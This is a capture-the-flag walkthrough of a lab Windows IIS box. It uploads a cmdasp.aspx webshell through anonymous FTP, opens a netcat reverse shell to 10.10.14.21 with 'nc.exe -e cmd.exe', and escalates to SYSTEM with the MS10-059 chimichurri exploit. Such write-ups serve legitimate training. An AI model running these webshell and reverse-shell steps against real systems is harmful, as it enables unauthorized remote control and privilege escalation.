### FTP (Port 21)
In the nmap scan we see that anonymous login is allowed, we enter there and find this

```bash
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

The file iisstart.htm is the index file which is showed when you enter the website http://10.10.10.5/

Lets try to upload a webshell in the ftp service and load it in the webapp. We will use the webshell located in `/usr/share/webshells/aspx/cmdasp.aspx`

```bash
ftp> put cmdasp.aspx 
local: cmdasp.aspx remote: cmdasp.aspx
229 Entering Extended Passive Mode (|||49195|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************|  1442        5.61 MiB/s    --:-- ETA
226 Transfer complete.
1442 bytes sent in 00:00 (16.56 KiB/s)
```

Access to webshell http://10.10.10.5/cmdasp.aspx and we are in. Transfer the binary nc.exe with a impacket smb server and then with a netcat listerner we cath a proper shell

```bash
Execute in webshell:
	C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.21 1234

-----------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234              
listening on [any] 1234 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.5] 49202
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

After some enumeration we can't find anything so using the Windows Exploit Suggester we find that chimichurri (MS10-059) could work. Move the binary though impacket smb server and execute it

```bash
C:\Windows\Temp\chimichurri.exe 10.10.14.21 1234

------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234              
listening on [any] 1234 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.5] 49209
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users>whoami
whoami
nt authority\system
```


And we are nt authority\system!